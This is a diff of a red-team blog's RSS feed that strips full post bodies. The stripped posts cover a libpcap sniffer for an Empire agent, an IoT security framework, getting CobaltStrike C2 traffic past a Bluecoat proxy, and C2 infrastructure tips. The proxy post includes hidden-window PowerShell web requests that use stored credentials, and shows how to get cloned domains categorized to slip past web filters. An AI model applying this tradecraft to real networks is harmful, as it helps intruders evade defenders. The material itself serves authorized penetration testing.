-&lt;pre&gt;&lt;code&gt;pcap_dump_open(): open a file to which to write packets  
-
-pcap_dumper_t *pcap_dump_open(pcap_t *p, const char *fname);
-    is called to open a ``savefile&#39;&#39; for writing. fname specifies the name of
-    the file to open. The file will have the same format as those used by
-    tcpdump(1) and tcpslice(1). The name &amp;quot;-&amp;quot; is a synonym for stdout.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;implementation:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;PCAP_FILENAME = &#39;test.pcap&#39;
-# setup pointer
-pcap_dump_open = pcap.pcap_dump_open
-pcap_dump_open.restype = ctypes.POINTER(ctypes.c_void_p)
-# get pointer 
-pcap_dumper_t = pcap.pcap_dump_open(pcap_handle,PCAP_FILENAME)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;pcap-capture&#34;&gt;Pcap Capture&lt;/h3&gt;
-
-&lt;p&gt;All the prior functionality is setup; we will need to setup a loop for packet capture. We can do this a few ways within libpcap, the first is using pcap_next_ex() or pcap_loop(). Using pcap_loop requires a callback to be setup, which I was unable to do properly and have must of it commented out. So, if you know how to do that, some help would be great. For the mean time, we will use pcap_next_ex in a loop since its blocking.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;pcap_next_ex():read the next packet from a pcap_t  
-
-int pcap_next_ex(pcap_t *p, struct pcap_pkthdr **pkt_header,
-    const u_char **pkt_data);
-
-reads the next packet and returns a success/failure indication. If the packet
-was read without problems, the pointer pointed to by the pkt_header argument
-is set to point to the pcap_pkthdr struct for the packet, and the pointer
-pointed to by the pkt_data argument is set to point to the data in the packet.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;In this implementation we will also use custom cTypes structures, just like you would see in a C struc. Using this method we will setup a pcap_pkthdr() structure to populate, we than get a cTypes pointer to feed to pcap_next_ex().&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;class pcap_pkthdr(ctypes.Structure):
-    _fields_ = [(&amp;quot;tv_sec&amp;quot;, ctypes.c_long), (&amp;quot;tv_usec&amp;quot;, ctypes.c_long),
-    (&amp;quot;caplen&amp;quot;, ctypes.c_uint), (&amp;quot;len&amp;quot;, ctypes.c_uint)]
-
-pcap_pkthdr_p = ctypes.POINTER(pcap_pkthdr)()
-packetdata = ctypes.POINTER(ctypes.c_ubyte*65536)()
-
-c = 0
-while True:
-    if (pcap.pcap_next_ex(pcap_handle, ctypes.byref(pcap_pkthdr_p), ctypes.byref(packetdata)) == 1):
-        # our output function pcap_dump()
-        pcap.pcap_dump(pcap_dumper_t,pcap_pkthdr_p,packetdata)
-        #pkthandler(pcap_pkthdr_p,packetdata)
-        c += 1
-    if c &amp;gt; PCAP_CAPTURE_COUNT:
-        if DEBUG:
-            print &amp;quot;* Max packet count reached!&amp;quot;
-        break
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;hr /&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;The full repo can be found here:&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/NIX-Sniffer-Examples&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
-&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;The full script:&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;script src=&#34;https://gist.github.com/killswitch-GUI/ce347f79f5cdb90bd8056100c90e9be2.js&#34;&gt;&lt;/script&gt;
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/2017/02/os-x-packet-capture--empire/</guid>
+      <description>Recently I have been preparing for some additional support for Empire and the Python agent. With that comes some new modules cooking, finally getting to porting the Linux sniffer over to OS X. While some of you know it’s easy with raw sockets on the Linux side. OS X does not natively support this, and you often see question that relate to how to get this to work on the OS X side.</description>
     </item>
     
     <item>
       <title>Homeland of Things (HoT) Framework Launch</title>
-      <link>https://cybersyndicates.com/2017/01/homeland-of-things-framework-launch/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/2017/01/homeland-of-things-framework-launch/</link>
       <pubDate>Tue, 10 Jan 2017 22:15:41 -0500</pubDate>
       
-      <guid>https://cybersyndicates.com/2017/01/homeland-of-things-framework-launch/</guid>
-      <description>
-
-&lt;p&gt;&lt;a href=&#34;https://homelandofthings.org&#34;&gt;&lt;img src=&#34;https://homelandofthings.org/wp-content/uploads/2016/12/HoT_Cover-232x300.jpg&#34; alt=&#34;alt text&#34; title=&#34;Read the HoT Framework&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;contact&#34;&gt;Contact&lt;/h3&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Author: Daniel West&lt;/li&gt;
-&lt;li&gt;Twitter: @reaperb0t&lt;/li&gt;
-&lt;li&gt;E-mail: admin@homelandofthings.org&lt;/li&gt;
-&lt;li&gt;Website: &lt;a href=&#34;https://homelandofthings.org&#34;&gt;https://homelandofthings.org&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
-
-&lt;p&gt;Vulnerabilities, threats, and subsequent risks are inherent with Internet of Things (IoT) devices, which typically reside at the meeting place of critical infrastructure and cyberspace. We present the HoT Framework to promote best practices for all Federal and State, Local, Tribal, and Territorial (SLTT) governments, non-government organizations (NGOs), and the private sector to use as a foundation for the reconnaissance, interrogation, and hardening of IoT nodes that are characterized as existing within both critical and non-critical infrastructure throughout the physical network layer, logical network layer, and cyber-persona layer of cyberspace terrain. In addition, we propose solutions for, public awareness of, and information sharing regarding the vulnerabilities, threats, risks, mitigations, and countermeasures associated with the IoT. The HoT Framework serves to assist Federal and SLTT governments, NGOs, and the private sector in thwarting attacks against their IoT devices and preventing their IoT devices from being used as an attack platform. For the framework to be effective, we need direct support from the DHS, DoD, DOJ, and other Federal agencies. We will also need to establish partnerships with SLTT, NGO, and the private sector (academia and industry) to further enrich and develop the framework using real-world data. We will continue to enrich the framework with technical modules and videos that demonstrate how to conduct the steps within the framework.&lt;/p&gt;
-
-&lt;h3 id=&#34;homelandofthings-org&#34;&gt;HomelandofThings.org&lt;/h3&gt;
-
-&lt;p&gt;Visit &lt;a href=&#34;https://homelandofthings.org&#34;&gt;https://homelandofthings.org&lt;/a&gt; to read the full PDF created using GitBook. We also welcome feedback at admin@homelandofthings.org.&lt;/p&gt;
-
-&lt;h3 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h3&gt;
-
-&lt;p&gt;Total Pages: 43 with Images&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;Acknowledgements&lt;/li&gt;
-&lt;li&gt;Preface&lt;/li&gt;
-&lt;li&gt;The Internet of Things (IoT)&lt;/li&gt;
-&lt;li&gt;The IoT in Cyberspace and Cyber-Electromagnetic Activities&lt;/li&gt;
-&lt;li&gt;Vulnerabilities in the IoT&lt;/li&gt;
-&lt;li&gt;Threats to the IoT&lt;/li&gt;
-&lt;li&gt;Risks to Homeland Security
-
-&lt;ul&gt;
-&lt;li&gt;Cybersecurity and Homeland Security Doctrine Review&lt;/li&gt;
-&lt;li&gt;Homeland Cybersecurity Risk Assessment&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;The Homeland of Things Framework
-
-&lt;ul&gt;
-&lt;li&gt;Reconnaissance and Interrogation to Detect Vulnerabilities and Adversary Presence within the Physical Network Layer&lt;/li&gt;
-&lt;li&gt;Reconnaissance and Interrogation to Detect Vulnerabilities and Adversary Presence within the Logical Network Layer&lt;/li&gt;
-&lt;li&gt;Reconnaissance and Interrogation to Detect Vulnerabilities and Adversary Presence within the Cyber-Persona Layer&lt;/li&gt;
-&lt;li&gt;Mitigating Vulnerabilities and Protecting Against Adversary Attacks within the Physical Network Layer&lt;/li&gt;
-&lt;li&gt;Mitigating Vulnerabilities and Protecting Against Adversary Attacks within the Logical Network Layer&lt;/li&gt;
-&lt;li&gt;Mitigating Vulnerabilities and Protecting Against Adversary Attacks within the Cyber-Persona Layer&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;References&lt;br /&gt;&lt;/li&gt;
-&lt;/ol&gt;
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/2017/01/homeland-of-things-framework-launch/</guid>
+      <description>Contact  Author: Daniel West Twitter: @reaperb0t E-mail: admin@homelandofthings.org Website: https://homelandofthings.org  Background Vulnerabilities, threats, and subsequent risks are inherent with Internet of Things (IoT) devices, which typically reside at the meeting place of critical infrastructure and cyberspace. We present the HoT Framework to promote best practices for all Federal and State, Local, Tribal, and Territorial (SLTT) governments, non-government organizations (NGOs), and the private sector to use as a foundation for the reconnaissance, interrogation, and hardening of IoT nodes that are characterized as existing within both critical and non-critical infrastructure throughout the physical network layer, logical network layer, and cyber-persona layer of cyberspace terrain.</description>
     </item>
     
     <item>
       <title>Egressing Bluecoat with CobaltStike &amp; Let&#39;s Encrypt</title>
-      <link>https://cybersyndicates.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/</link>
       <pubDate>Sun, 04 Dec 2016 21:39:41 -0500</pubDate>
       
-      <guid>https://cybersyndicates.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/</guid>
-      <description>
-
-&lt;p&gt;&lt;iframe width=&#34;640&#34; height=&#34;360&#34; src=&#34;https://www.youtube.com/embed/cgwfjCmKQwM?rel=0&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
-This post is a bit different than other posts I have done in the past, the material I will talking about directly helped me overcome an extremely challenging engagement. When it comes to egress protections I personally am not often met with an environment that I can&amp;rsquo;t get out of. It&amp;rsquo;s not about the skill level of the operator, just the techniques, and processes that we employee as a team and we stick to ensure successful engagements.&lt;/p&gt;
-
-&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
-
-&lt;p&gt;During a recent engagement, we followed many of the tips I mentioned in my last post: &lt;a href=&#34;https://cybersyndicates.com/2016/11/top-red-team-tips/&#34;&gt;https://cybersyndicates.com/2016/11/top-red-team-tips/&lt;/a&gt; including using separate C2 transports for each stage of the engagement. Unfortunately, during initial access we were able to obtain DNS callbacks, but never able to transition to our active OP&amp;rsquo;s team server via HTTP or HTTP(S).&lt;/p&gt;
-
-&lt;h3 id=&#34;identifying-a-proxy&#34;&gt;Identifying a Proxy&lt;/h3&gt;
-
-&lt;p&gt;Once you identified issues with obtaining a callback via HTTP or HTTP(S) you should immediately start thinking:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Proxy (web proxy)&lt;/li&gt;
-&lt;li&gt;HTTP(S) interception&lt;/li&gt;
-&lt;li&gt;Domain Categorization&lt;/li&gt;
-&lt;li&gt;Domain life / Rating&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;While you could have other issues like HIPS stopping injection, process with no token context. I have also seen people use elevated (SYSTEM) context and attempting to spawn with no way to authenticate to the proxy.&lt;/p&gt;
-
-&lt;p&gt;The first step it to troubleshoot and see if that user can even authenticate to the proxy. I often use PowerShell to easily check to see if I can reach common sites, here is an example:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;powershell.exe -w hidden -command $wc = New-Object System.Net.Webclient; $wc.Headers.Add(&#39;User-Agent&#39;,&#39;Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko&#39;); $wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $wc.downloadstring(&#39;http://google.com/&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Once you have confirmed that the token context or process that your currently in has the ability to authenticate you can move forward. If not try the following:&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;Target a user process and inject into that to operate within.&lt;/li&gt;
-&lt;li&gt;Target specific process: exporer.exe, chrome.exe, ie.exe&lt;/li&gt;
-&lt;li&gt;Move to a different beacon, often proxies will expire connections. I have been in situations where the beacon would go stale every 30 or so mins.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h3 id=&#34;egress-constraints&#34;&gt;Egress Constraints&lt;/h3&gt;
-
-&lt;p&gt;Once you have confirmed that you are dealing with a proxy, you will have to start troubleshooting the issues. The three things we will cover: Domain Age, Domain Categorization, HTTPS Certs.&lt;/p&gt;
-
-&lt;h4 id=&#34;domain-age&#34;&gt;Domain Age&lt;/h4&gt;
-
-&lt;p&gt;In most cases domain age does not come into play. While it’s very rare we see an environment with that level of egress protections, its totally reasonable to be doing. Websense can perform this, bluecoat uses WebFilter and domain age of 14 days or less are often blocked by these devices.&lt;/p&gt;
-
-&lt;p&gt;To test for this I often take an older domain that I know is blog personally owned site. These are often only a few years old and they will help you potentially rule out the domain age. You could follow many of the steps and may have to retool to a domain maybe you owned for a good bit. I know I hold about 5 domains myself for testing so domain age &lt;em&gt;should&lt;/em&gt; not be a major issue.&lt;/p&gt;
-
-&lt;h4 id=&#34;domain-categorization&#34;&gt;Domain Categorization&lt;/h4&gt;
-
-&lt;p&gt;We often out of habit attempt to get our domain categorized before we start and engagement. This process is scary easy and we often only go to a few different locations. Some safe bets to target:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Government&lt;/li&gt;
-&lt;li&gt;IT Tech&lt;/li&gt;
-&lt;li&gt;Finance&lt;/li&gt;
-&lt;li&gt;News&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Try to avoid personal tags, streaming service etc, those can often be blocked to prevent bandwidth use or they don&amp;rsquo;t want their employees spending all day on Hulu. You can easily clone a site with:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;wget –mk www.example.com
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I suggest taking the time and finding something close with the keywords that you are trying to target for domain categorization. Once you have the website setup submit it to the following:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://sitereview.bluecoat.com/sitereview.jsp&#34;&gt;https://sitereview.bluecoat.com/sitereview.jsp&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://community.opendns.com/domaintagging/&#34;&gt;https://community.opendns.com/domaintagging/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.brightcloud.com/tools/change-request-url-categorization.php&#34;&gt;https://www.brightcloud.com/tools/change-request-url-categorization.php&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://archive.lightspeedsystems.com&#34;&gt;https://archive.lightspeedsystems.com&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://support.forcepoint.com/KBArticle?id=How-To-Submit-Uncategorized-Sites&#34;&gt;https://support.forcepoint.com/KBArticle?id=How-To-Submit-Uncategorized-Sites&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&#34;domain-certification&#34;&gt;Domain Certification&lt;/h4&gt;
-
-&lt;p&gt;The last thing that plays into the domain overall score is if it contains a proper SSL cert. For a long time, up till recently to obtain an SSL cert you had to go through a register that would properly issue you a cert and prove you owned the domain etc. Many levels of authenticity exist for SSL certs. So this added a small level of complexity for most testers due to the monetary investment as well as the time it generally took to be issued the cert.&lt;/p&gt;
-
-&lt;p&gt;Three types of certs we will see; Wildcard, Multi-Domain, and EV (Extended Validation)/SAN certs. While different proxies likely filter and block on the type of cert, I would imagine most environments will allow properly signed certs through. In my case, I was using the self-signed certificate from CobaltStrike and being blocked. Using a self-signed cert not only looks highly suspicious but also could be easily blocked. We will be using Let&amp;rsquo;s Encrypt next to help build that domain ranking, score and hopefully find a path out.&lt;/p&gt;
-
-&lt;p&gt;Its general worth just using the PowerShell one liner to request your C2 HTTPS site. Letting you see a returned a status code or HTML that fingerprint the Proxy you are being blocked by. In my case I was able to see the Bluecoat ProxySG page displayed for “blocked content”.&lt;/p&gt;
-
-&lt;p&gt;The last thing we will test is the ability to reach a “sample” site that would match your parameters. Using PowerShell once again we will attempt to find a site that has the correct domain categorization and contains a Let&amp;rsquo;s Encrypt Cert. In my case I used Cybersyndicates.com since I host my site with a LetsEncypt cert and I have IT / Computer Security Rating with Bluecoat.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;powershell.exe -w hidden -command $wc = New-Object System.Net.Webclient; $wc.Headers.Add(&#39;User-Agent&#39;,&#39;Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko&#39;); $wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $wc.downloadstring(&#39;https://cybersyndicates.com/&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This worked since Bluecoat trusted the root chain of the cert which is signed by DST. We now know a bit of intel of what is stopping us and how we can circumvent this.&lt;/p&gt;
-
-&lt;h2 id=&#34;cobaltstrike-integration-with-let-s-encypt-process&#34;&gt;CobaltStrike Integration with Let&amp;rsquo;s Encypt Process&lt;/h2&gt;
-
-&lt;p&gt;Once you have found a combination that works its time move forward with setting up your C2 Server. The process is a bit long manually, so follow along and at the end, I will provide an easy to use setup script for this entire process.&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;Install the following:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;Sudo apt-get install keytool openssl git apache2 -y
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Start Apache2&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;service apache2 start
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Check to ensure Apache2 is listening on 80, and the return value should 1. *note: this is important as Let&amp;rsquo;s Encrypt will use this to verify you own the domain.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;lsof -nPi | grep -i apache | grep -c &amp;quot;:80 (LISTEN)&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;In my case with Ubuntu images allow port 80,443 through the firewall:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;ufw allow 80/tcp
-ufw allow 443/tcp
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Install Let&amp;rsquo;s Encrypt:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;git clone https://github.com/certbot/certbot /opt/Let&#39;s Encrypt
-cd /opt/Let&#39;s Encrypt
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Run Let&amp;rsquo;s Encrypt ($domain is you domain name): *note: I found the &amp;ndash;register-unsafely-without-email flag hidden in the documentation, which will allow you easily run this script without any prompts from Let&amp;rsquo;s Encrypt&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;./Let&#39;s Encrypt-auto --apache -d $domain -n --register-unsafely-without-email --agree-tos
-cat /etc/Let&#39;s Encrypt/live/$domain/fullchain.pem
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Following some documentation from CobaltStrike (&lt;a href=&#34;https://www.cobaltstrike.com/help-malleable-c2&#34;&gt;https://www.cobaltstrike.com/help-malleable-c2&lt;/a&gt;) we find we will need a Java KeyStore, to do this will first need make our PKCS12 certs.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;cd /etc/Let&#39;s Encrypt/live/$domain
-openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out $domainPkcs -name $domain -passout pass:$password
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Building java keystore via keytool:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;keytool -importkeystore -deststorepass $password -destkeypass $password -destkeystore $domainStore -srckeystore $domainPkcs -srcstoretype PKCS12 -srcstorepass $password -alias $domain
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Make a directory for https in CS dir, and copy the new store:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;mkdir ~/CobaltStrike/https
-cp $domainStore ~/CobaltStrike/https/
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Setup CobaltStrike Malleable C2 Profile to use SSL cert:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;wget https://raw.githubusercontent.com/rsmudge/Malleable-C2-Profiles/master/normal/amazon.profile --no-check-certificate -O amazon.profile
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Add the following lines to the new amazon profile with the settings you built the keystore with:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;https-certificate {
-set keystore &amp;quot;domain.store&amp;quot;;
-set password &amp;quot;mypassword&amp;quot;;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&#34;cobaltstrike-integration-with-let-s-encypt-automated&#34;&gt;CobaltStrike Integration with Let&amp;rsquo;s Encypt Automated&lt;/h2&gt;
-
-&lt;p&gt;Of course, I had to do this on MANY domains so I automated the process so you don’t make mistakes and this whole process takes less that 2 mins top!&lt;/p&gt;
-
-&lt;script src=&#34;https://gist.github.com/killswitch-GUI/bdf00b3bc7035abf7d42c516933d0cac.js&#34;&gt;&lt;/script&gt;
-</description>
+      <guid>http://cybersyndicates.obscuritylabs.com/2016/12/egressing-bluecoat-with-cobaltstike-letsencrypt/</guid>
+      <description>This post is a bit different than other posts I have done in the past, the material I will talking about directly helped me overcome an extremely challenging engagement. When it comes to egress protections I personally am not often met with an environment that I can&amp;rsquo;t get out of. It&amp;rsquo;s not about the skill level of the operator, just the techniques, and processes that we employee as a team and we stick to ensure successful engagements.</description>
     </item>
     
     <item>
       <title>6 Red Team Infrastructure Tips</title>
-      <link>https://cybersyndicates.com/2016/11/top-red-team-tips/</link>
+      <link>http://cybersyndicates.obscuritylabs.com/2016/11/top-red-team-tips/</link>
       <pubDate>Wed, 30 Nov 2016 16:08:28 -0500</pubDate>
       
-      <guid>https://cybersyndicates.com/2016/11/top-red-team-tips/</guid>
-      <description>
-
-&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;
-
-&lt;ol&gt;
-&lt;li&gt;CLI Logging of All Operator Terminal&lt;/li&gt;
-&lt;li&gt;Restricted Payload Delivery&lt;/li&gt;
-&lt;li&gt;Separate Servers / C2 Phases for all Stages of an Engagement&lt;/li&gt;
-&lt;li&gt;Always Use Redirectors in Front of Core C2&lt;/li&gt;
-&lt;li&gt;Full Session / Metadata Network Capture on Redirectors and C2&lt;/li&gt;
-&lt;li&gt;Never Share C2 IOC’s&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;As some of you may know I made a huge transition recently from my former team ATD (Adaptive Threat Division) at Veris Group to Sony’s internal Red Team. This was, of course, a major move, but the opportunity to help develop and stand up that capability was hard to pass up. This was a dream for me and to do it with some extremely dedicated and talented coworkers is always a bonus.&lt;/p&gt;
-
-&lt;p&gt;This brings me to our subject, recently I had put a ton of time into thinking out red team architecture and wanted to share. This will cover security and tips for a successful engagement. While some of this may seem “excessive”, you have to take this type of work very serious as you will be holding the keys to the kingdom of your company or target! With data dumps like shadow brokers apparently owning the equation group (Not here to say that’s true or valid data) nothing is safe and we must reduce our risk and only expose limited attack surface just as we help our clients.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;strong&gt;1. CLI Logging of All Operator Terminals:&lt;/strong&gt;
-You may be thinking why in world would I need this level of fidelity and data? Well, a really good buddy of mine &lt;a href=&#34;https://www.sixdub.net/&#34;&gt;@sixdub&lt;/a&gt; let me on to this a year or so ago for a potential integrity and data preservation method for potential discrepancies or de-conflictions. I’m taking this opportunity to push this forward on some of our first OP’s. Below is a tool built for just the right solution:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Find the setup here:&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/lterm&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
-&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Here is a small example of global terminal logging:&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;iframe src=&#34;https://player.vimeo.com/video/194050322?autoplay=1&amp;loop=1&#34; width=&#34;640&#34; height=&#34;400&#34; frameborder=&#34;0&#34; webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;strong&gt;2. Restricted Payload Delivery :&lt;/strong&gt;
-This is something I have not done in a bit and generally only required during specific circumstances. I’m here to tell you that we may be doing it all wrong, after an incident where a payload was spread via a secondary source and made its way out of scope you will want to take this advice. Ensure that not only are there clearly defined scoping and external IP space but take the time to setup your C2 to only allow communication to your payload stagger to trusted sources. A couple ways you can go about this which is some really cool work from @bluescreenofjeff is using Apache mod_rewrite rules. In a combination of the mod rewrite edits you can raise the sophistication level of uncovering your C2.   &lt;a href=&#34;https://bluescreenofjeff.com/tags#mod_rewrite&#34;&gt;bluescreenofjeff mod_rewrite series&lt;/a&gt; has some great ways we can get super paranoid during setup. Using rules for OS, mobile hits (how you want to handle these), browser based (using an HTA like this for IE:  &lt;a href=&#34;https://github.com/killswitch-GUI/PenTesting-Scripts/blob/master/ProxyAware-ps-Stager.hta&#34;&gt;HTA-Example&lt;/a&gt;) and even handling user redirection not matching our C2 Profile we use. One of the main concerns is we want to ensure that our payload just does not stage to external IP space that may out of scope or even an IR toolset, this will increase the duration and sophistication to a long living C2 architecture.
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/apache_mod_overview.png&#34; alt=&#34;VPS with apache mod_rewrite&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Image Credit: &lt;a href=&#34;https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/&#34;&gt;https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;strong&gt;3. Separate Servers / C2 Phases for all Stages of an Engagement:&lt;/strong&gt;
-This tip is crucial during the construction of your engagements infrastructure. Splitting up your C2 will provide you flexibility, stealth and ability to roll C2 on the unfortunate day you get burnt. So, what do I mean by “splitting” up the Infrastructure? Well in some cases you may be conducting a OP with one team server, but during a red team, all phases of the OP should be separated.
-&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/4w7krkqxRck&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
-This is a bit of safeguard against burning all of your C2 at one time as well as providing redundancy, and a separate team server for coworkers. I have found splitting this up into three core components as seems to be quite effective! Below is a basic layout and beginning of what our team arch should look like:&lt;br /&gt;
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
-            &lt;p&gt;
-                &lt;img src=&#34;https://cybersyndicates.com/image/seprate_vps.jpg&#34; alt=&#34;seprate vps red team&#34;/&gt;
-            &lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-    
-&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;strong&gt;4. Always Use Redirectors in Front of Core C2:&lt;/strong&gt;
-This is not always enforced depending on engagement and type of operation you are conducting. Heck, I have broken this rule in all types of scenarios, for phishing or another quick testing. The reality of the matter your core C2 servers or “Team Servers” if you are a CS user are HVA (High-Value Assets) and need to be secured like one. This mean full-scale firewall to only allow the ports used for an engagement (80,443,8080) and IPTable rules for allowed IP space for ssh and inbound connections from our redirectors. While our redirectors will come and go we need to trust our core C2 servers, and if they are exposed at any given time all it takes is a patient attacker to gain access. Lastly, never re-use a redirector. NEVER CROSS STREAMS!
-
-
-
-
-    
-    
-        
-        
-        
-        
-        
-    
-
-
-    
-    
-    
-    
-    
-
-    
-    
-        
-    
-    
-
-
-
-    
-    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
-        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
